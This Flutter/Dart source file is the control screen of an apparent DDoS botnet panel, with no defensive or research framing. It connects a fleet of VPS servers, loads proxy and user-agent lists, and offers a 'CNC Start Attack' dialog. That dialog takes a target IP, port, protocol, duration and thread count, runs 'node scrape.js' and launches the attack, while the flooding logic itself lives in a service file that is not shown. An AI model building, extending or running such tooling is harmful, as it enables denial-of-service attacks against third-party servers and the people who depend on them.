import 'dart:async';
import 'package:flutter/material.dart';
import '../services/cnc_service.dart';
import '../services/vps_server_service.dart';
import '../models/models.dart';

class CncMonitoringScreen extends StatefulWidget {
  const CncMonitoringScreen({super.key});

  @override
  State<CncMonitoringScreen> createState() => _CncMonitoringScreenState();
}

class _CncMonitoringScreenState extends State<CncMonitoringScreen>
    with TickerProviderStateMixin {
  final CncService _cncService = CncService();
  final VpsServerService _vpsService = VpsServerService();

  late TabController _tabController;
  StreamSubscription? _monitoringSubscription;

  Map<String, dynamic> _monitoringData = {};
  bool _isConnecting = false;
  String _connectionStatus = 'Disconnected';

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 4, vsync: this);
    _loadInitialData();
    _setupMonitoringStream();
  }

  @override
  void dispose() {
    _tabController.dispose();
    _monitoringSubscription?.cancel();
    super.dispose();
  }

  void _loadInitialData() {
    setState(() {
      _monitoringData = _cncService.getMonitoringData();
    });
  }

  void _setupMonitoringStream() {
    _monitoringSubscription = _cncService.monitoringStream.listen((data) {
      if (mounted) {
        setState(() {
          _monitoringData = data;
        });
      }
    });
  }

  Future<void> _connectAllVps() async {
    setState(() {
      _isConnecting = true;
      _connectionStatus = 'Connecting...';
    });

    try {
      final result = await _cncService.connectAllVps();

      if (mounted) {
        setState(() {
          _isConnecting = false;
          _connectionStatus = result['success']
              ? 'Connected (${result['connectedCount']}/${result['totalCount']})'
              : 'Failed';
        });

        // Show result dialog
        _showConnectionResult(result);
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _isConnecting = false;
          _connectionStatus = 'Error';
        });

        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Connection failed: $e'),
            backgroundColor: Colors.red,
          ),
        );
      }
    }
  }

  void _showConnectionResult(Map<String, dynamic> result) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text(
          result['success'] ? '✅ Connection Success' : '❌ Connection Failed',
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'Connected: ${result['connectedCount']}/${result['totalCount']} VPS',
            ),
            const SizedBox(height: 8),
            if (result['errors'].isNotEmpty) ...[
              const Text(
                'Errors:',
                style: TextStyle(fontWeight: FontWeight.bold),
              ),
              ...result['errors'].map<Widget>((error) => Text('• $error')),
            ],
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('OK'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('CNC Monitoring'),
        bottom: TabBar(
          controller: _tabController,
          tabs: const [
            Tab(icon: Icon(Icons.dashboard), text: 'Overview'),
            Tab(icon: Icon(Icons.computer), text: 'VPS Status'),
            Tab(icon: Icon(Icons.play_arrow), text: 'Operations'),
            Tab(icon: Icon(Icons.settings), text: 'Configuration'),
          ],
        ),
        actions: [
          IconButton(
            onPressed: _isConnecting ? null : _connectAllVps,
            icon: _isConnecting
                ? const SizedBox(
                    width: 20,
                    height: 20,
                    child: CircularProgressIndicator(strokeWidth: 2),
                  )
                : const Icon(Icons.power),
            tooltip: 'Connect All VPS',
          ),
        ],
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          _buildOverviewTab(),
          _buildVpsStatusTab(),
          _buildOperationsTab(),
          _buildConfigurationTab(),
        ],
      ),
    );
  }

  Widget _buildOverviewTab() {
    final connectedCount = _monitoringData['connectedVpsCount'] ?? 0;
    final totalCount = _monitoringData['totalVpsCount'] ?? 0;
    final proxyCount = _monitoringData['proxyCount'] ?? 0;
    final userAgentCount = _monitoringData['userAgentCount'] ?? 0;

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // Status Card
          Card(
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Icon(
                        _connectionStatus.contains('Connected')
                            ? Icons.check_circle
                            : Icons.error,
                        color: _connectionStatus.contains('Connected')
                            ? Colors.green
                            : Colors.red,
                      ),
                      const SizedBox(width: 8),
                      Text(
                        'Status: $_connectionStatus',
                        style: Theme.of(context).textTheme.titleMedium,
                      ),
                    ],
                  ),
                  const SizedBox(height: 16),
                  Row(
                    children: [
                      Expanded(
                        child: _buildStatCard(
                          'VPS Connected',
                          '$connectedCount/$totalCount',
                          Icons.computer,
                          Colors.blue,
                        ),
                      ),
                      const SizedBox(width: 16),
                      Expanded(
                        child: _buildStatCard(
                          'Proxies',
                          '$proxyCount',
                          Icons.vpn_lock,
                          Colors.green,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 16),
                  Row(
                    children: [
                      Expanded(
                        child: _buildStatCard(
                          'User Agents',
                          '$userAgentCount',
                          Icons.web,
                          Colors.orange,
                        ),
                      ),
                      const SizedBox(width: 16),
                      Expanded(
                        child: _buildStatCard(
                          'Success Rate',
                          totalCount > 0
                              ? '${((connectedCount / totalCount) * 100).toStringAsFixed(1)}%'
                              : '0%',
                          Icons.trending_up,
                          Colors.purple,
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),

          const SizedBox(height: 16),

          // Quick Actions
          Card(
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'Quick Actions',
                    style: Theme.of(context).textTheme.titleMedium,
                  ),
                  const SizedBox(height: 16),
                  Row(
                    children: [
                      Expanded(
                        child: ElevatedButton.icon(
                          onPressed: _isConnecting ? null : _connectAllVps,
                          icon: const Icon(Icons.power),
                          label: const Text('Connect All VPS'),
                        ),
                      ),
                      const SizedBox(width: 16),
                      Expanded(
                        child: ElevatedButton.icon(
                          onPressed: () => _loadInitialData(),
                          icon: const Icon(Icons.refresh),
                          label: const Text('Refresh'),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildVpsStatusTab() {
    final vpsStatus =
        _monitoringData['vpsStatus'] as Map<String, dynamic>? ?? {};
    final userAgents =
        _monitoringData['userAgents'] as Map<String, dynamic>? ?? {};
    final servers = _vpsService.servers;

    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: servers.length,
      itemBuilder: (context, index) {
        final server = servers[index];
        final isConnected = vpsStatus[server.id] == true;
        final userAgent = userAgents[server.id] ?? 'Not assigned';

        return Card(
          margin: const EdgeInsets.only(bottom: 8),
          child: ListTile(
            leading: CircleAvatar(
              backgroundColor: isConnected ? Colors.green : Colors.red,
              child: Icon(
                isConnected ? Icons.check : Icons.close,
                color: Colors.white,
              ),
            ),
            title: Text(server.name),
            subtitle: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text('${server.host}:${server.port}'),
                Text(
                  'User Agent: ${userAgent.length > 50 ? '${userAgent.substring(0, 50)}...' : userAgent}',
                  style: const TextStyle(fontSize: 12),
                ),
              ],
            ),
            trailing: Icon(
              isConnected ? Icons.wifi : Icons.wifi_off,
              color: isConnected ? Colors.green : Colors.red,
            ),
          ),
        );
      },
    );
  }

  Widget _buildOperationsTab() {
    final activeOperations = _cncService.getActiveOperations();
    final operationHistory = _cncService.getOperationHistory();

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // Quick Actions
          Card(
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'CNC Operations',
                    style: Theme.of(context).textTheme.titleMedium,
                  ),
                  const SizedBox(height: 16),
                  Column(
                    children: [
                      Row(
                        children: [
                          Expanded(
                            child: ElevatedButton.icon(
                              onPressed: () => _executeCncSetup(),
                              icon: const Icon(Icons.build),
                              label: const Text('CNC Setup'),
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.orange,
                              ),
                            ),
                          ),
                          const SizedBox(width: 16),
                          Expanded(
                            child: ElevatedButton.icon(
                              onPressed: () => _showCncStartDialog(),
                              icon: const Icon(Icons.play_arrow),
                              label: const Text('CNC Start'),
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.green,
                              ),
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 12),
                      Container(
                        padding: const EdgeInsets.all(12),
                        decoration: BoxDecoration(
                          color: Colors.blue.withValues(alpha: 0.1),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(
                            color: Colors.blue.withValues(alpha: 0.3),
                          ),
                        ),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              'ℹ️ Operation Flow:',
                              style: TextStyle(
                                fontWeight: FontWeight.bold,
                                color: Colors.blue[700],
                              ),
                            ),
                            const SizedBox(height: 4),
                            Text(
                              '1. Connect All VPS → Focus on VPS connection only\n'
                              '2. CNC Setup → Load proxy configuration\n'
                              '3. CNC Start → Auto-run node scrape.js + start attack',
                              style: TextStyle(
                                fontSize: 12,
                                color: Colors.blue[600],
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),

          const SizedBox(height: 16),

          // Active Operations
          if (activeOperations.isNotEmpty) ...[
            Card(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Active Operations (${activeOperations.length})',
                      style: Theme.of(context).textTheme.titleMedium,
                    ),
                    const SizedBox(height: 16),
                    ...activeOperations.map((op) => _buildOperationTile(op)),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 16),
          ],

          // Operation History
          Card(
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'Operation History (${operationHistory.length})',
                    style: Theme.of(context).textTheme.titleMedium,
                  ),
                  const SizedBox(height: 16),
                  if (operationHistory.isEmpty)
                    const Center(child: Text('No operations yet'))
                  else
                    ...operationHistory
                        .take(10)
                        .map((op) => _buildOperationTile(op)),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildOperationTile(CncOperation operation) {
    final statusColor = Color(
      int.parse('0xFF${operation.statusColor.substring(1)}'),
    );

    return Card(
      margin: const EdgeInsets.only(bottom: 8),
      child: ListTile(
        leading: CircleAvatar(
          backgroundColor: statusColor,
          child: Icon(
            _getOperationIcon(operation.type),
            color: Colors.white,
            size: 20,
          ),
        ),
        title: Text('${operation.typeDisplayName} - ${operation.vpsName}'),
        subtitle: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('Status: ${operation.statusDisplayName}'),
            if (operation.duration != null)
              Text('Duration: ${operation.duration!.inSeconds}s'),
            if (operation.errorMessage != null)
              Text(
                'Error: ${operation.errorMessage}',
                style: const TextStyle(color: Colors.red),
              ),
          ],
        ),
        trailing: operation.isActive
            ? IconButton(
                icon: const Icon(Icons.cancel),
                onPressed: () => _cncService.cancelOperation(operation.id),
              )
            : Icon(
                operation.status == CncOperationStatus.completed
                    ? Icons.check_circle
                    : Icons.error,
                color: statusColor,
              ),
      ),
    );
  }

  IconData _getOperationIcon(CncOperationType type) {
    switch (type) {
      case CncOperationType.setup:
        return Icons.build;
      case CncOperationType.start:
        return Icons.play_arrow;
      case CncOperationType.stop:
        return Icons.stop;
      case CncOperationType.status:
        return Icons.info;
      case CncOperationType.restart:
        return Icons.refresh;
      case CncOperationType.update:
        return Icons.update;
    }
  }

  Future<void> _executeCncSetup() async {
    try {
      // Show loading dialog
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (context) => const AlertDialog(
          content: Row(
            children: [
              CircularProgressIndicator(),
              SizedBox(width: 16),
              Text('Loading proxy configuration...'),
            ],
          ),
        ),
      );

      final result = await _cncService.cncSetup();

      // Close loading dialog
      if (mounted) Navigator.of(context).pop();

      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              '📋 CNC Setup completed: ${result.completedCount}/${result.operations.length} operations successful',
            ),
            backgroundColor: result.isAllCompleted
                ? Colors.green
                : Colors.orange,
          ),
        );
      }
    } catch (e) {
      // Close loading dialog if still open
      if (mounted) Navigator.of(context).pop();

      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('CNC Setup failed: $e'),
            backgroundColor: Colors.red,
          ),
        );
      }
    }
  }

  void _showCncStartDialog() {
    final targetController = TextEditingController();
    final portController = TextEditingController(text: '80');
    final durationController = TextEditingController(text: '60');
    final threadsController = TextEditingController(text: '100');
    String selectedMethod = 'HTTP';

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('🚀 CNC Start Attack'),
        contentPadding: const EdgeInsets.fromLTRB(24, 20, 24, 0),
        content: ConstrainedBox(
          constraints: BoxConstraints(
            maxHeight: MediaQuery.of(context).size.height * 0.7,
            maxWidth: MediaQuery.of(context).size.width * 0.9,
          ),
          child: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.green.withValues(alpha: 0.1),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(
                      color: Colors.green.withValues(alpha: 0.3),
                    ),
                  ),
                  child: Row(
                    children: [
                      Icon(Icons.info, color: Colors.green[700], size: 20),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Text(
                          'Will auto-run node scrape.js before starting attack',
                          style: TextStyle(
                            fontSize: 12,
                            color: Colors.green[700],
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 16),
                TextField(
                  controller: targetController,
                  decoration: const InputDecoration(
                    labelText: 'Target IP',
                    hintText: 'e.g., 192.168.1.1',
                  ),
                ),
                const SizedBox(height: 16),
                TextField(
                  controller: portController,
                  decoration: const InputDecoration(
                    labelText: 'Port',
                    hintText: 'e.g., 80',
                  ),
                  keyboardType: TextInputType.number,
                ),
                const SizedBox(height: 16),
                DropdownButtonFormField<String>(
                  value: selectedMethod,
                  decoration: const InputDecoration(labelText: 'Method'),
                  items: ['HTTP', 'HTTPS', 'TCP', 'UDP']
                      .map(
                        (method) => DropdownMenuItem(
                          value: method,
                          child: Text(method),
                        ),
                      )
                      .toList(),
                  onChanged: (value) => selectedMethod = value!,
                ),
                const SizedBox(height: 16),
                TextField(
                  controller: durationController,
                  decoration: const InputDecoration(
                    labelText: 'Duration (seconds)',
                    hintText: 'e.g., 60',
                  ),
                  keyboardType: TextInputType.number,
                ),
                const SizedBox(height: 16),
                TextField(
                  controller: threadsController,
                  decoration: const InputDecoration(
                    labelText: 'Threads',
                    hintText: 'e.g., 100',
                  ),
                  keyboardType: TextInputType.number,
                ),
              ],
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel'),
          ),
          ElevatedButton(
            onPressed: () async {
              if (targetController.text.isNotEmpty) {
                Navigator.pop(context);
                await _executeCncStart(
                  targetController.text,
                  int.tryParse(portController.text) ?? 80,
                  selectedMethod,
                  int.tryParse(durationController.text) ?? 60,
                  int.tryParse(threadsController.text) ?? 100,
                );
              }
            },
            child: const Text('Start Attack'),
          ),
        ],
      ),
    );
  }

  Future<void> _executeCncStart(
    String targetIp,
    int port,
    String method,
    int duration,
    int threads,
  ) async {
    try {
      await _cncService.cncStart(
        targetIp: targetIp,
        port: port,
        method: method,
        duration: duration,
        threads: threads,
      );
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Attack started on $targetIp:$port'),
            backgroundColor: Colors.green,
          ),
        );
      }
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Attack failed: $e'),
            backgroundColor: Colors.red,
          ),
        );
      }
    }
  }

  Widget _buildConfigurationTab() {
    final proxyList = _monitoringData['proxyList'] as List<String>? ?? [];
    final userAgentList =
        _monitoringData['userAgentList'] as List<String>? ?? [];

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // Proxy Configuration
          Card(
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'Proxy Configuration (${proxyList.length})',
                    style: Theme.of(context).textTheme.titleMedium,
                  ),
                  const SizedBox(height: 8),
                  Container(
                    height: 150,
                    decoration: BoxDecoration(
                      border: Border.all(color: Colors.grey),
                      borderRadius: BorderRadius.circular(4),
                    ),
                    child: ListView.builder(
                      itemCount: proxyList.length,
                      itemBuilder: (context, index) {
                        return Padding(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 8,
                            vertical: 2,
                          ),
                          child: Text(
                            proxyList[index],
                            style: const TextStyle(fontFamily: 'monospace'),
                          ),
                        );
                      },
                    ),
                  ),
                ],
              ),
            ),
          ),

          const SizedBox(height: 16),

          // User Agent Configuration
          Card(
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'User Agents (${userAgentList.length})',
                    style: Theme.of(context).textTheme.titleMedium,
                  ),
                  const SizedBox(height: 8),
                  Container(
                    height: 150,
                    decoration: BoxDecoration(
                      border: Border.all(color: Colors.grey),
                      borderRadius: BorderRadius.circular(4),
                    ),
                    child: ListView.builder(
                      itemCount: userAgentList.length,
                      itemBuilder: (context, index) {
                        return Padding(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 8,
                            vertical: 2,
                          ),
                          child: Text(
                            userAgentList[index],
                            style: const TextStyle(
                              fontFamily: 'monospace',
                              fontSize: 12,
                            ),
                          ),
                        );
                      },
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatCard(
    String title,
    String value,
    IconData icon,
    Color color,
  ) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.1),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: color.withValues(alpha: 0.3)),
      ),
      child: Column(
        children: [
          Icon(icon, color: color, size: 24),
          const SizedBox(height: 8),
          Text(
            value,
            style: TextStyle(
              fontSize: 18,
              fontWeight: FontWeight.bold,
              color: color,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            title,
            style: const TextStyle(fontSize: 12),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }
}
